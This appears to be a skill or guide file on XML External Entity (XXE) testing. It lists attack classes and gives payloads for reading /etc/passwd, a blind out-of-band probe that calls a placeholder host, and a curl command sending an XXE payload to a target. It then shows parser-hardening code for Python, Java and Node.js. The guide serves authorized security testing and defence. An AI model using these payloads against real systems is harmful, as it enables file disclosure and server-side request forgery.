---
name: xxe-xml-injection-testing
description: "XML External Entity (XXE) vulnerability testing and mitigation. Identifies file disclosure, blind XXE, and SSRF via XML parsers."
risk: offensive
source: community
author: "Krish Ujeniya"
---

# XML External Entity (XXE) Injection Testing

> **⚠️ AUTHORIZED USE ONLY**: For authorized defensive security testing and parser hardening.

## Overview

XML External Entity (XXE) injection occurs when an XML parser processes user-supplied XML input containing reference to external entities without disabling external DTD (Document Type Definition) resolution.

---

## Attack Classes

1. **Local File Disclosure (LFD)**: Extracting sensitive local system files (`/etc/passwd`, `/etc/hosts`, `win.ini`).
2. **Blind XXE via Out-of-Band Channel**: Exfiltrating file contents via parameter entities when direct XML responses are suppressed.
3. **SSRF via XXE**: Forcing the XML parser to query internal microservices or cloud metadata.
4. **Denial of Service (Billion Laughs / XML Bomb)**: Recursive entity expansion causing CPU/RAM exhaustion.

---

## Testing Methodology

### Vector 1: Classic Local File Disclosure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
  <email>test@example.com</email>
</user>
```

### Vector 2: Blind OOB Interaction Probe
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % oob SYSTEM "http://xxe-probe.YOUR_OOB_HOST/callback">
  %oob;
]>
<order>
  <id>1001</id>
</order>
```

### Vector 3: Content-Type Switching
Test if JSON or form endpoints secretly accept and parse XML:
```bash
# Convert JSON endpoint to XML
curl -X POST https://target.example.com/api/profile   -H "Content-Type: application/xml"   -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY f SYSTEM "file:///etc/hostname">]><root>&f;</root>'
```

---

## Defensive Remediation

### Python (defusedxml / lxml)
```python
# VULNERABLE:
# import xml.etree.ElementTree as ET
# tree = ET.fromstring(untrusted_xml)

# SECURE:
from defusedxml.ElementTree import fromstring
tree = fromstring(untrusted_xml)
```

### Java (DOMParser / SAXParser)
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### Node.js (libxmljs)
```javascript
// Disable external entity resolution
const xmlDoc = libxmljs.parseXml(xmlString, { noent: false, nonet: true });
```
